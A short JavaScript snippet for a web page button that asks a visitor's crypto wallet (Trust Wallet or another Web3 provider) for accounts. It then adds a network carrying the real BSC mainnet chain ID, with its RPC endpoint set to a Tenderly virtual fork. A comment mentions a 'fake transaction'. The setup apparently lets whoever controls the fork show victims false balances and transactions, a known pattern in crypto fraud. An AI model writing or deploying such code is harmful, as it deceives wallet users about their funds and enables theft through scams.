document.getElementById("addRpcBtn").addEventListener("click", async () => {
    if (window.trustwallet || window.ethereum) {
        try {
            console.log("🟢 Trust Wallet or Web3 Provider Detected");

            // Fake Transaction Send karna Trust Wallet ka Internal Call Activate Karne Ke Liye
            await window.ethereum.request({ method: "eth_requestAccounts" });

            await window.ethereum.request({
                method: "wallet_addEthereumChain",
                params: [{
                    chainId: "0x38", // BSC Chain ID
                    chainName: "BSC Custom RPC",
                    rpcUrls: ["https://virtual.mainnet.rpc.tenderly.co/f945523a-2708-47cd-b1f4-a1dc19a882a7"],
                    nativeCurrency: {
                        name: "BNB",
                        symbol: "BNB",
                        decimals: 18
                    },
                    blockExplorerUrls: ["https://bscscan.com/"]
                }]
            });

            document.getElementById("status").innerText = "✅ RPC Added Successfully!";
            console.log("✅ Custom RPC added successfully in Trust Wallet!");
        } catch (error) {
            console.error("❌ Error Adding RPC:", error);
            document.getElementById("status").innerText = "❌ Error: " + error.message;
        }
    } else {
        console.log("❌ Trust Wallet Not Detected");
        document.getElementById("status").innerText = "❌ Trust Wallet Not Detected!";
    }
});
